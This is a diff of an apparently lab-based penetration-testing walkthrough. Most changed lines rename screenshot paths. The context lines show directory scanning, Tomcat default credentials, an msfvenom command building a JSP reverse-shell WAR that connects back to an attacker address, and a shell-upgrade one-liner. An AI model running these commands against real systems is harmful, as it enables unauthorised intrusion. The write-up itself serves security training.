@@ -215,11 +215,11 @@ dirb http://172.16.64.101:8080/
 dirb http://172.16.64.101:9080/
 ```
 
-![](<../../../.gitbook/assets/image (42) (1).png>)
+![](<../../../.gitbook/assets/image (42) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (68) (1).png>)
 
-![](<../../../.gitbook/assets/image (50).png>)
+![](<../../../.gitbook/assets/image (50) (1).png>)
 
 ```
 tomcat:s3cret
@@ -241,7 +241,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.64.10 LPORT=4444 -f war -o r
 
 ![](<../../../.gitbook/assets/image (58) (1).png>)
 
-![](<../../../.gitbook/assets/image (30) (1) (1).png>)
+![](<../../../.gitbook/assets/image (30) (1) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (13).png>)
 
@@ -258,7 +258,7 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 ![](<../../../.gitbook/assets/image (21) (1).png>)
 
-![](<../../../.gitbook/assets/image (23) (1).png>)
+![](<../../../.gitbook/assets/image (23) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (39) (1) (1).png>)
 
@@ -268,7 +268,7 @@ tomcat:s3cret
 role1:tomcat
 ```
 
-![](<../../../.gitbook/assets/image (40) (1) (1).png>)
+![](<../../../.gitbook/assets/image (40) (1) (1) (1).png>)
 
 ![](<../../../.gitbook/assets/image (17) (1) (1).png>)
 
@@ -282,7 +282,7 @@ role1:tomcat
 
 ![](<../../../.gitbook/assets/image (53) (1).png>)
 
-![](<../../../.gitbook/assets/image (41) (1) (1).png>)
+![](<../../../.gitbook/assets/image (41) (1) (1) (1).png>)
 
 > The HyperText Transfer Protocol (HTTP) 401 Unauthorized response status code indicates that the client request has not been completed because it lacks valid authentication credentials for the requested resource.
 
@@ -365,4 +365,4 @@ ssh developer@172.16.64.182
 
 ### Flag
 
-![](<../../../.gitbook/assets/image (51) (1).png>)
+![](<../../../.gitbook/assets/image (51) (1) (1).png>)
